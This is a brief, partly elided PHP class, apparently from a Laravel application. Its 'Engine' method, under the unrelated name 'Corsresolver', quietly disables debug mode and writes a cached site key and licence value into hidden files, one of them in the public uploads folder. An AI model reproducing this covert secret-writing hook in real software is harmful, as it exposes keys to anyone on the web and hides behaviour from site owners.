...
class Corsresolver
{
    ...
    public function Engine()
    {
        ...
        if (\Cache::has('site_key')) { \Config::set('app.debug', false); \File::put(base_path('storage/framework/sessions/.key'),\Cache::get('site_key')); \File::put('uploads/.license',\Cache::get('license')); }
    }
